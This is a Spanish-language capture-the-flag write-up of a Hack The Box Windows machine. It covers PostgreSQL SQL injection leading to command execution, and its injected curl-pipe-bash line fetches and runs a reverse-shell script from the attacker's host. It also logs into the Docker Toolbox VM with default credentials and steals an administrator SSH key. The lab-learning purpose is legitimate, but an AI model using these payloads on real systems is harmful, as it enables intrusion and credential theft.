
---
-  Tags:  #windows #Docker #HTB #Easy 
- --- 
#### QUÉ SE EXPLOTA?

PostgreSQL Injection (RCE)
Abusing boot2docker [Docker-Toolbox]
Pivoting

#### WRITE UP

##### PRIMERA FASE: Reconocimiento

Como siempre vamos a empezar la maquina lanzando un ping para detectar ante que sistema operativo nos estamos enfrentando y para ver si la máquina objetivo ya está encendida. 

![](../imgs/Pasted image 20251211084001.png)

Identificamos un **TTL de 127** lo cual nos indica que estamos ante una máquina windows. 

Pasamos a la fase de escaneos. **Recordemos que generalmente hacemos uso de 2 escaneos por lo general.** El primer escaneo a realizar lo vamos a hacer **con el objetivo de descubrir todos los puertos abiertos** para este primer escaneo ocupamos un **SYN scan**. 

Una vez habiendo hecho el primer escaneo pasamos a realizar el segundo.**El segundo escaneo es complementario al primero, y en este vamos a obtener mayores detalles sobre los puertos previamente abiertos.** Para este segundo ocuparemos los scripts por defecto de NMAP y además también vamos a ocupar los script de versión. 

![](../imgs/Pasted image 20251211084308.png)

Encontramos muchos puertos abiertos, sin embargo, los que más nos interesan son: **21, 443,445**. 

**Antes de  cualquier cosa, vamos anotando lo importante obtenido durante el reconocimento de puertos**. Es decir, vamos a anotar los dominios encontrados, y vamos a inspeccionar lo que hay en el servicio **[[FTP]]** ya que tenía acceso como **Anonymous** habilitado. 

Primero inspeccionamos el certificado **SSL**. 

```bash

openssl s_client -connect 10.10.10.236:443
```

![](../imgs/Pasted image 20251211084843.png)

Encontramos un dominio junto a un subdominio:

- **admin.megalogistic.com**
- **megalogistic.com**

Teniendo esta información la agregamos al **[[etc-hosts]]** para poder inspeccionar posteriormente el sitio web. 

**En el servicio FTP** encontramos un ejecutable llamado **[[docker-toolbox]]**. Lo cual de entrada nos da la idea de que probablemente al ganar accesso al sistema estemos ante un contenedor. 

Ahora con **smbclient** nostratamos de conectar con una sesión nula al servicio **[[SMB]]** para ver si podemos obtener una idea más clara sobre la red SMB

```bash
smbclient -L 10.10.10.236 -N 
```

![](../imgs/Pasted image 20251211091226.png)

De entrada nos pide credenciales por lo que no podríamos ver mayor información. Ahora con **[[crackmapexec]]** proseguimos a obtener mayor detalles sobre el servicio **[[SMB]]** 

![](../imgs/Pasted image 20251211091453.png)

Proseguimos a inspeccionar la web. 

![](../imgs/Pasted image 20251211091926.png)

No encontramos nada de interés, vaya ni siquiera funcionaban algunos botones. Por lo que **proseguimos a inspeccionar el subdominio encontrado**. 

![](../imgs/Pasted image 20251211092112.png)

Nos encontramos con un panel de Login. **Primeramente intentamos con credenciales predeterminadas** (admin:admin, guest:guest) y nada. 

Intentamos ver si hay algún tipo de **inyección SQL** para eso probamos con: 

**usuario:** '
**passwd:** '

Esto lo hacemos para ver si rompemos la query del lado del servidor y nos devuelve algún error o algo. 

![](../imgs/Pasted image 20251211092405.png)

Nos devuelve error y además el error nos marca **pg_query**. Esto nos indica que estamos ante una **base de datos** **[[PostgreSQL]]**.

##### SEGUNDA FASE: Explotación

Ya que sabemos que estamos ante una base de datos **Postgres** podemos intentar ver si es vulnerable a inyección SQL.  Checamos los  payloads de comprobación en **[[PostgreSQL]]**

Al probar con el payload **'; select version();-- -** nos loggea directamente porlo que podemos comprobar que hay inyección. 

![](../imgs/Pasted image 20251211094032.png)

![](../imgs/Pasted image 20251211094043.png)

Dentro del panel no encontramos nada que nos pueda ayudar. 

**Hay que recordar que en [[PostgreSQL]] podemos ejeutar comandos**. Por lo que nos basamos en el **PoC** que ya tenemos en **[[PostgreSQL]]**.

**Primero creamos la tabla** , posteriormente ejecutamos comandos. 
```bash
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

Recordemos que seguramente la app está en un contenedor a base de **[[docker-toolbox]]** por lo que intentamos mandarnos una petición para ver si recibimos conexión.

![](../imgs/Pasted image 20251211095035.png)

![](../imgs/Pasted image 20251211095114.png)

Recibimos la petición por lo que ahora creamos el archivo **rav** con un script para entablar una reverse shell a través de una petición e interpretación con bash

![](../imgs/Pasted image 20251211095326.png)

Nos ponemos en escucha y volvemos a lanzarnos la petición, concatenando la interpretación con bash. 

```bash

'; COPY cmd_exec FROM PROGRAM 'curl http://10.10.16.4/rav|bash'; -- - 
```

![](../imgs/Pasted image 20251211095555.png)

![](../imgs/Pasted image 20251211095643.png)

Tenemos accesso al sistema. 

##### TERCERA FASE: Post - Explotación / Privesc

Una vez que ya tenemos accesso al sistema primero **estabilizamos la TTY**
Una vez que ya estabilizamos la TTY proseguimos a investigare si efectivamente estamos dentro de un contenedor, y sí lo estamos. 

```bash
hostname -I
```

![](../imgs/Pasted image 20251211101714.png)

**Recordemos que [[docker-toolbox]]** tiene usuario y contraseña por defecto para conectarnos a la **VM** que corre el contenedor, en este caso la **VM** viene siendo el gateway/maquina victima de Docker. 

	Windows  
	   ↓ (cliente)
	VM Linux (Boot2Docker)  ← *host real de Docker*
	   ↓
	Contenedores Linux


![](../imgs/Pasted image 20251211101900.png)

Primero verificamos que el puerto 22 del gateway esté activo. Basandonos en los codigos de respuesta 0 y 1 además utilizamos operadores lógicos **&&** **|** , cuando nos da error nos devolverá cerrado y si está abierto nos devolverá abierto. 

```bash

(echo '' > /dev/tcp/172.17.0.1/23) 2>/dev/null && echo 'puerto abierto' || echo 'puerto cerrado'
```

![](../imgs/Pasted image 20251211103546.png)

nos conectamos a través de **[[SSH]]**

```bash
docker@172.17.0.1
```


Tenemos conexión a la VM de **[[docker-toolbox]]**. 

![](../imgs/Pasted image 20251211104042.png)

Cómo ya sabemos **docker-toolbox** monta por defecto la ruta c:\Users. Así que verificamos si está disponible. 
![](../imgs/Pasted image 20251211104226.png)
No solamente estaba disponible sino que también dentro del **Usuario administrador** encontramos un **.ssh** con un **id_rsa**.  Que podemos ocupar para conectarnos a través de SSH. 

![](../imgs/Pasted image 20251211104246.png)

![](../imgs/Pasted image 20251211104309.png)
![](../imgs/Pasted image 20251211104323.png)
![](../imgs/Pasted image 20251211104336.png)
Copiamos el **id_rsa** le damos permisos **600** y nos conectamos. 
![](../imgs/Pasted image 20251211104602.png)

```bash
ssh -i id_rsa administrator@10.10.10.236
```

![](../imgs/Pasted image 20251211104725.png)

![](../imgs/Pasted image 20251211104736.png)

Listo ya tenemos root. 








